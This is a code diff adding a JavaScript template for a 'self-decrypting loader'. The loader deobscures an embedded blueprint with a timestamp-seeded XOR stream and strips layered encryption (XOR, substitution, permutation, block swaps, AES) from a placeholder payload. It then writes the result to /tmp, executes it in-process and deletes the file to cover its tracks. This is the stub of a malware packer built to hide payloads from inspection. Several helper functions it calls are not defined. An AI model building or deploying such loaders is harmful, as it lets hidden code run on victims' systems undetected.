@@ -1,0 +1,82 @@
+// loader_js.template
+// Placeholder for JavaScript self-decrypting loader 
+
+/* --- loader_js.template START --- */
+const crypto = require('crypto');
+const fs = require('fs');
+
+// 1. Obscured blueprint
+const OBSCURED_BP = "{blueprint_obscured_str}";
+// 2. Encrypted payload
+const ENCRYPTED_PAYLOAD_B64 = "{encrypted_payload_b64}";
+const TIMESTAMP_INT = {timestamp_int};
+
+class SeededPRNG {
+    constructor(seed) {
+        this.state = seed >>> 0;
+    }
+    nextByte() {
+        // Simple LCG: X_{n+1} = (a * X_n + c) % m
+        this.state = (1664525 * this.state + 1013904223) % 0x100000000;
+        return (this.state >>> 16) & 0xFF;
+    }
+}
+
+function deobscureBlueprint(obs) {
+    let raw = Buffer.from(obs, 'base64');
+    let prng = new SeededPRNG(TIMESTAMP_INT);
+    for (let i = 0; i < raw.length; i++) {
+        raw[i] = raw[i] ^ prng.nextByte();
+    }
+    return raw.toString('utf-8');
+}
+
+function decryptPayload(payloadB64, bp) {
+    let data = Buffer.from(payloadB64, 'base64');
+    let steps = bp.steps.slice().reverse();
+    steps.forEach(step => {
+        const prim = step.primitive;
+        const params = step.parameters;
+        if (prim === 'xor') {
+            let prng = new SeededPRNG(params.seed);
+            for (let i = 0; i < data.length; i++) {
+                data[i] ^= prng.nextByte();
+            }
+        } else if (prim === 'substitute') {
+            let sbox = generateSBoxFromParams(params);
+            let inv = invertSBox(sbox);
+            data = Buffer.from(data.map(byte => inv[byte]));
+        } else if (prim === 'permute') {
+            let order = reconstructPermutation(params);
+            let invOrder = invertPermutation(order);
+            data = applyPermutation(data, invOrder);
+        } else if (prim === 'swap') {
+            let order = reconstructBlockOrder(params);
+            let invOrder = invertBlockOrder(order);
+            data = mergeBlocks(data, invOrder);
+        } else if (prim === 'aes') {
+            let iv = Buffer.from(params.iv_hex, 'hex');
+            let key = Buffer.from(bp.metadata.aes_key_hex, 'hex');
+            data = aesDecrypt(data, key, iv);
+        } else {
+            throw new Error(`Unknown primitive: ${prim}`);
+        }
+    });
+    return data;
+}
+
+(async () => {
+    // 1. Integrity check (optional)
+    // ...
+    // 2. Deobscure blueprint
+    let blueprintJson = deobscureBlueprint(OBSCURED_BP);
+    let bp = JSON.parse(blueprintJson);
+    // 3. Decrypt payload
+    let decrypted = decryptPayload(ENCRYPTED_PAYLOAD_B64, bp);
+    // 4. Save to /tmp/dec_code.js and run
+    fs.writeFileSync('/tmp/dec_code.js', decrypted);
+    require('/tmp/dec_code.js');  // run in same process
+    // 5. Cleanup
+    fs.unlinkSync('/tmp/dec_code.js');
+})();
+/* --- loader_js.template END --- */ 
